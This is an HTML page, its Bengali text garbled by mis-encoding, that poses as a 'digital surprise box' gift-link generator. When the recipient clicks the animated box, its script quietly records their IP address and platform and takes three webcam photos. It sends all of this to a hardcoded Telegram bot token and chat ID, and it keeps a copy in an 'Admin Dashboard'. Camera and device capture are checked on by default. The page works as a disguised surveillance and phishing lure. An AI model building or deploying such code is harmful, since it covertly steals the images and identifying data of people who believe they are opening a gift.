<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #4A6CF7;
            --primary-dark: #3A5CE5;
            --secondary-color: #6C63FF;
            --accent-color: #FF6B8B;
            --background-gradient: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
            --text-dark: #2D3748;
            --text-light: #718096;
            --success-color: #10B981;
            --border-radius: 12px;
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }

        /* Themes */
        .theme-birthday { --theme-primary: #FF6B8B; --theme-secondary: #FF8FA3; --theme-gift-box: #FF6B8B; --theme-gift-lid: #FF8FA3; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%); }
        .theme-anniversary { --theme-primary: #D4AF37; --theme-secondary: #FFD700; --theme-gift-box: #D4AF37; --theme-gift-lid: #FFD700; --theme-ribbon: #FF6B8B; --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%); }
        .theme-newyear { --theme-primary: #10B981; --theme-secondary: #34D399; --theme-gift-box: #10B981; --theme-gift-lid: #34D399; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%); }
        .theme-proposal { --theme-primary: #EC4899; --theme-secondary: #F472B6; --theme-gift-box: #EC4899; --theme-gift-lid: #F472B6; --theme-ribbon: #C084FC; --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%); }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Poppins', sans-serif; background: var(--theme-background); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; color: var(--text-dark); transition: background 0.5s ease; }
        
        .container { background: white; padding: 25px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); width: 100%; max-width: 500px; text-align: center; position: relative; margin-bottom: 20px; overflow: hidden; }
        .container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary)); }

        h1 { font-size: 22px; margin-bottom: 15px; color: var(--theme-primary); }
        .hidden { display: none !important; }

        /* Form Elements */
        .form-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 14px; }
        input, textarea, select { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 8px; font-family: inherit; font-size: 15px; }
        button { width: 100%; padding: 14px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; transition: 0.3s; background: var(--theme-primary); color: white; }

        /* Theme Selector */
        .theme-selector { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; justify-content: center; }
        .theme-option { padding: 8px 12px; border: 2px solid #e2e8f0; border-radius: 8px; cursor: pointer; font-size: 13px; }
        .theme-option.active { border-color: var(--theme-primary); background: #f0f4ff; color: var(--theme-primary); }

        /* Dashboard Style */
        #admin-dashboard { width: 100%; max-width: 500px; background: #1a202c; color: #48bb78; border-radius: 12px; padding: 20px; font-family: monospace; text-align: left; margin-top: 20px; display: none; }
        .log-item { border-bottom: 1px solid #2d3748; padding: 10px 0; font-size: 12px; }
        .log-img { width: 60px; height: 60px; object-fit: cover; margin-top: 5px; border: 1px solid #48bb78; }

        /* Gift Box Styles (Original) */
        .gift-wrapper { position: relative; width: 200px; height: 200px; margin: 20px auto; cursor: pointer; }
        .gift-box { width: 100%; height: 100%; position: relative; animation: float 3s infinite; }
        .box-body { width: 150px; height: 150px; background: var(--theme-gift-box); position: absolute; bottom: 0; left: 25px; border-radius: 8px; }
        .lid { width: 160px; height: 40px; background: var(--theme-gift-lid); position: absolute; top: 10px; left: 20px; z-index: 2; transition: 1s; border-radius: 5px; }
        .gift-box.open .lid { transform: translateY(-50px) rotate(-10deg); opacity: 0; }
        .gift-box.open { animation: scaleDown 1s forwards; }

        /* Typewriter & Message */
        .message-container { background: #f8fafc; padding: 20px; border-radius: 10px; border-left: 5px solid var(--theme-primary); margin-top: 20px; opacity: 0; text-align: left; }
        .message-container.show { opacity: 1; transition: 1s; }
        .typewriter { font-family: monospace; font-size: 16px; white-space: pre-wrap; }

        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes scaleDown { 100% { transform: scale(0); opacity: 0; } }
        
        .victory-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 999; }
    </style>
</head>
<body>

    <!-- ‡ßß. ‡¶Æ‡ßÇ‡¶≤ ‡¶´‡¶∞‡ßç‡¶Æ (Sender View) -->
    <div class="container" id="form-container">
        <h1>üéÅ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</h1>
        
        <div class="theme-selector">
            <div class="theme-option active" data-theme="birthday">‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®</div>
            <div class="theme-option" data-theme="anniversary">‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ</div>
            <div class="theme-option" data-theme="newyear">‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶õ‡¶∞</div>
            <div class="theme-option" data-theme="proposal">‡¶™‡ßç‡¶∞‡¶™‡ßã‡¶ú‡¶æ‡¶≤</div>
            <div class="theme-option" data-theme="custom">‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ</div>
        </div>

        <form id="giftForm">
            <div class="form-group"><label>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ:</label><input type="text" id="senderName" required></div>
            <div class="form-group"><label>‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label><input type="text" id="receiverName" required></div>
            <div class="form-group"><label>‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</label><textarea id="message" rows="3" required></textarea></div>
            
            <div class="form-group">
                <label>‡¶õ‡¶¨‡¶ø ‡¶¨‡¶æ GIF URL (‡¶ó‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡¶ø ‡¶•‡ßá‡¶ï‡ßá ‡¶®‡¶ø‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®):</label>
                <input type="url" id="imageURL">
                <div id="quick-gallery" style="margin-top: 10px; display: flex; gap: 5px; overflow-x: auto; padding-bottom: 5px;">
                    <!-- JS will fill this -->
                </div>
            </div>

            <div class="form-group" style="background: #f1f5f9; padding: 10px; border-radius: 8px;">
                <label style="display:flex; align-items:center; gap:8px;">
                    <input type="checkbox" id="enableCountdown"> ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶°‡¶æ‡¶â‡¶® ‡¶ü‡¶æ‡¶á‡¶Æ‡¶æ‡¶∞
                </label>
                <input type="datetime-local" id="countdownDateTime" class="hidden" style="margin-top:10px;">
            </div>

            <div class="form-group">
                <label><input type="checkbox" id="enableCamera" checked> ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶õ‡¶¨‡¶ø ‡¶§‡ßÅ‡¶≤‡¶¨‡ßá</label>
                <label><input type="checkbox" id="enableInfo" checked> ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶§‡¶•‡ßç‡¶Ø ‡¶®‡¶ø‡¶¨‡ßá</label>
            </div>

            <button type="submit">‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </form>

        <div id="linkContainer" class="hidden" style="margin-top:20px; padding:15px; background:#eef2ff; border-radius:8px;">
            <p style="font-size:12px; margin-bottom:5px;">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®:</p>
            <input type="text" id="finalLink" readonly>
            <button id="copyBtn" style="margin-top:10px; background:#10B981;">‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>

        <button id="showLogsBtn" style="margin-top:20px; background:#4A5568;">View Activity Log (Dashboard)</button>
    </div>

    <!-- ‡ß®. ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶°‡ßç‡¶Ø‡¶æ‡¶∂‡¶¨‡ßã‡¶∞‡ßç‡¶° (‡¶è‡¶ü‡¶ø ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶Æ‡ßÇ‡¶≤ ‡¶™‡ßá‡¶ú‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá) -->
    <div id="admin-dashboard">
        <h3><i class="fas fa-database"></i> Admin Dashboard</h3>
        <p style="font-size:10px; color:#888;">(‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠‡¶æ‡¶∞‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø‡¶ó‡ßÅ‡¶≤‡ßã ‡¶¶‡ßá‡¶ñ‡¶æ ‡¶Ø‡¶æ‡¶¨‡ßá)</p>
        <div id="log-list">
            <p id="no-log">‡¶è‡¶ñ‡¶®‡ßã ‡¶ï‡ßã‡¶®‡ßã ‡¶°‡¶æ‡¶ü‡¶æ ‡¶®‡ßá‡¶á...</p>
        </div>
    </div>

    <!-- ‡ß©. ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ (Receiver View) -->
    <div class="container hidden" id="gift-container">
        <h2 id="receiverDisplay"></h2>
        <div id="timerDisplay" class="hidden" style="font-size:24px; font-weight:700; color:red; margin:20px 0;"></div>
        
        <div id="gift-content-main">
            <h3 id="themeTitle"></h3>
            <div class="gift-wrapper" id="giftWrapper">
                <div class="gift-box" id="giftBox">
                    <div class="lid"></div><div class="box-body"></div>
                </div>
                <div id="revealed-content" class="hidden">
                    <img id="giftImage" src="" style="max-width:100%; border-radius:10px; margin-bottom:15px;">
                </div>
            </div>
            <p id="clickHint">‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßã!</p>
        </div>
    </div>

    <div class="victory-effect" id="victoryEffect"></div>
    <video id="video" style="display:none" playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const TELEGRAM_BOT = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk";
        const CHAT_ID = "2139008203";

        const sampleGifs = [
            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-1.gif",
            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-2.gif",
            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-3.gif"
        ];

        // --- ‡¶°‡ßç‡¶Ø‡¶æ‡¶∂‡¶¨‡ßã‡¶∞‡ßç‡¶° ‡¶≤‡¶ú‡¶ø‡¶ï ---
        function saveToWebLog(type, data, isImg = false) {
            const list = document.getElementById('log-list');
            const noLog = document.getElementById('no-log');
            if(noLog) noLog.remove();

            const item = document.createElement('div');
            item.className = 'log-item';
            if(isImg) {
                item.innerHTML = `<strong>[${type}]</strong><br><img src="${data}" class="log-img">`;
            } else {
                item.innerHTML = `<strong>[${type}]</strong>: ${data}`;
            }
            list.prepend(item);
            
            // LocalStorage ‡¶è ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ (‡¶è‡¶ï‡¶á ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞‡ßá ‡¶ü‡ßá‡¶∏‡ßç‡¶ü ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ï‡¶æ‡¶ú‡ßá ‡¶≤‡¶æ‡¶ó‡¶¨‡ßá)
            let logs = JSON.parse(localStorage.getItem('giftLogs') || '[]');
            logs.push({type, data, isImg, time: new Date().toLocaleTimeString()});
            localStorage.setItem('giftLogs', JSON.stringify(logs));
        }

        // ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶≤‡ßá ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶≤‡¶ó ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
        window.onload = () => {
            let logs = JSON.parse(localStorage.getItem('giftLogs') || '[]');
            logs.reverse().forEach(l => {
                const noLog = document.getElementById('no-log');
                if(noLog) noLog.remove();
                const item = document.createElement('div');
                item.className = 'log-item';
                item.innerHTML = l.isImg ? `<strong>[${l.type}]</strong><br><img src="${l.data}" class="log-img">` : `<strong>[${l.type}]</strong>: ${l.data}`;
                document.getElementById('log-list').appendChild(item);
            });
        };

        // --- ‡¶ó‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡¶ø ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™ ---
        const gallery = document.getElementById('quick-gallery');
        sampleGifs.forEach(url => {
            const img = document.createElement('img');
            img.src = url;
            img.style.width = "50px"; img.style.height = "50px"; img.style.cursor="pointer"; img.style.borderRadius="5px";
            img.onclick = () => document.getElementById('imageURL').value = url;
            gallery.appendChild(img);
        });

        // --- ‡¶•‡¶ø‡¶Æ ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡¶∂‡¶® ---
        document.querySelectorAll('.theme-option').forEach(opt => {
            opt.onclick = () => {
                document.querySelector('.theme-option.active').classList.remove('active');
                opt.classList.add('active');
                document.body.className = 'theme-' + opt.dataset.theme;
            };
        });

        // ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶°‡¶æ‡¶â‡¶® ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶∂‡ßã/‡¶π‡¶æ‡¶á‡¶°
        document.getElementById('enableCountdown').onchange = (e) => {
            document.getElementById('countdownDateTime').classList.toggle('hidden', !e.target.checked);
        };

        // --- ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ---
        document.getElementById('giftForm').onsubmit = (e) => {
            e.preventDefault();
            const params = new URLSearchParams({
                sender: document.getElementById('senderName').value,
                receiver: document.getElementById('receiverName').value,
                msg: document.getElementById('message').value,
                img: document.getElementById('imageURL').value,
                theme: document.querySelector('.theme-option.active').dataset.theme,
                cd: document.getElementById('enableCountdown').checked ? document.getElementById('countdownDateTime').value : '',
                cam: document.getElementById('enableCamera').checked,
                info: document.getElementById('enableInfo').checked
            });
            const finalLink = window.location.href.split('?')[0] + '?' + params.toString();
            document.getElementById('finalLink').value = finalLink;
            document.getElementById('linkContainer').classList.remove('hidden');
        };

        document.getElementById('copyBtn').onclick = () => {
            document.getElementById('finalLink').select();
            document.execCommand('copy');
            alert('‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ï‡¶™‡¶ø ‡¶π‡ßü‡ßá‡¶õ‡ßá!');
        };

        document.getElementById('showLogsBtn').onclick = () => {
            const dash = document.getElementById('admin-dashboard');
            dash.style.display = dash.style.display === 'block' ? 'none' : 'block';
        };

        // --- ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶á‡¶° ‡¶≤‡¶ú‡¶ø‡¶ï ---
        const urlParams = new URLSearchParams(window.location.search);
        if(urlParams.has('sender')) {
            document.getElementById('form-container').classList.add('hidden');
            document.getElementById('gift-container').classList.remove('hidden');
            
            const receiver = urlParams.get('receiver');
            const cdTime = urlParams.get('cd');
            document.getElementById('receiverDisplay').innerText = "‡¶™‡ßç‡¶∞‡¶ø‡ßü " + receiver;
            document.body.className = 'theme-' + urlParams.get('theme');

            if(cdTime && new Date(cdTime) > new Date()) {
                document.getElementById('gift-content-main').classList.add('hidden');
                document.getElementById('timerDisplay').classList.remove('hidden');
                const timer = setInterval(() => {
                    const diff = new Date(cdTime) - new Date();
                    if(diff <= 0) {
                        clearInterval(timer);
                        location.reload();
                    }
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    document.getElementById('timerDisplay').innerText = `‡¶Ü‡¶®‡¶≤‡¶ï ‡¶π‡¶¨‡ßá: ${h}h ${m}m ${s}s`;
                }, 1000);
            } else {
                startGiftExperience();
            }
        }

        function startGiftExperience() {
            const giftWrapper = document.getElementById('giftWrapper');
            giftWrapper.onclick = async () => {
                giftWrapper.onclick = null;
                document.getElementById('giftBox').classList.add('open');
                document.getElementById('clickHint').innerText = "‡¶ñ‡ßÅ‡¶≤‡¶õ‡ßá...";

                // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶ï‡¶æ‡¶≤‡ßá‡¶ï‡¶∂‡¶® (Web Log + Telegram)
                if(urlParams.get('info') === 'true') fetchInfo();
                if(urlParams.get('cam') === 'true') capturePhotos();

                setTimeout(() => {
                    document.getElementById('giftBox').classList.add('hidden');
                    document.getElementById('revealed-content').classList.remove('hidden');
                    document.getElementById('clickHint').classList.add('hidden');
                    if(urlParams.get('img')) document.getElementById('giftImage').src = urlParams.get('img');
                    
                    showMessage();
                    triggerVictory();
                }, 1500);
            };
        }

        function showMessage() {
            const container = document.createElement('div');
            container.className = 'message-container show';
            const text = document.createElement('div');
            text.className = 'typewriter';
            container.innerHTML = `<h4>${urlParams.get('sender')} ‡¶è‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</h4>`;
            container.appendChild(text);
            document.getElementById('gift-container').appendChild(container);

            let i = 0;
            const msg = urlParams.get('msg');
            function type() {
                if(i < msg.length) {
                    text.innerHTML += msg.charAt(i);
                    i++;
                    setTimeout(type, 50);
                }
            }
            type();
        }

        async function fetchInfo() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const info = `IP: ${data.ip}\nPlatform: ${navigator.platform}\nTime: ${new Date().toLocaleString()}`;
                
                // ‡ßß. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${CHAT_ID}&text=üéÅ ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ñ‡ßã‡¶≤‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá!\n${info}`);
                
                // ‡ß®. ‡¶ì‡ßü‡ßá‡¶¨ ‡¶≤‡¶ó‡ßá
                saveToWebLog("DEVICE INFO", info);
            } catch(e) { saveToWebLog("ERROR", "Info fetch failed"); }
        }

        async function capturePhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                document.getElementById('video').srcObject = stream;
                await document.getElementById('video').play();
                
                for(let i=0; i<3; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    const canvas = document.getElementById('canvas');
                    canvas.width = 400; canvas.height = 300;
                    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 400, 300);
                    const imgData = canvas.toDataURL('image/jpeg');
                    
                    // ‡ßß. ‡¶ì‡ßü‡ßá‡¶¨ ‡¶≤‡¶ó‡ßá ‡¶∏‡ßá‡¶≠
                    saveToWebLog(`PHOTO ${i+1}`, imgData, true);

                    // ‡ß®. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶∏‡ßá‡¶®‡ßç‡¶°
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'pic.jpg');
                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {method:'POST', body:fd});
                    }, 'image/jpeg');
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { saveToWebLog("CAMERA ERROR", "Permission denied"); }
        }

        function triggerVictory() {
            const effect = document.getElementById('victoryEffect');
            for(let i=0; i<50; i++) {
                const p = document.createElement('div');
                p.style.position = 'absolute';
                p.style.width = '10px'; p.style.height = '10px';
                p.style.background = `hsl(${Math.random()*360}, 100%, 50%)`;
                p.style.left = Math.random()*100 + '%';
                p.style.top = '-10px';
                p.style.borderRadius = '50%';
                effect.appendChild(p);
                p.animate([{transform: 'translateY(0)'}, {transform: `translateY(${window.innerHeight}px) rotate(360deg)`}], {duration: 2000+Math.random()*3000, iterations: 1});
            }
        }
    </script>
</body>
</html>
